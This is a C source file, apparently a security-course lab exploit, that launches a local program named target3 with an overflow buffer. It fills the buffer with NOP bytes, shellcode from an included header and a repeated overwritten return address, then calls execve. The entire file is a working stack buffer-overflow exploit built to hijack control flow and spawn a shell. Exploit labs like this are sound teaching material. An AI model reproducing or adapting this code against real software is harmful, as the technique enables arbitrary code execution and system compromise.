#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define TARGET_ADDR_0 0x18
#define TARGET_ADDR_1 0xfe
#define TARGET_ADDR_2 0xa4
#define TARGET_ADDR_3 0x40
#define BUFSIZE 68 
#define ENVSIZE 13
#define SHELLSIZE 45
#define NOPSIZE 0
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attackBuffer[BUFSIZE+1];
	char envBuffer[ENVSIZE+1];
	
	int i = 0;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;
	}
	for (i = 0; i < SHELLSIZE; i++){
		attackBuffer[NOPSIZE + i] = shellcode[i];
	}
	for (i = NOPSIZE + SHELLSIZE + 4 - SHELLSIZE%4; i < BUFSIZE; i++){
		if(i%4==0){
			attackBuffer[i] = TARGET_ADDR_0;
		}else if(i%4==1){
			attackBuffer[i] = TARGET_ADDR_1;
		}else if(i%4==2){
			attackBuffer[i] = TARGET_ADDR_2;
		}else{
			attackBuffer[i] = TARGET_ADDR_3;
		}
	}
	envBuffer[ENVSIZE] = '\0';
	attackBuffer[BUFSIZE] = '\0';

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = "";
	//env[1] = envBuffer;
	

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
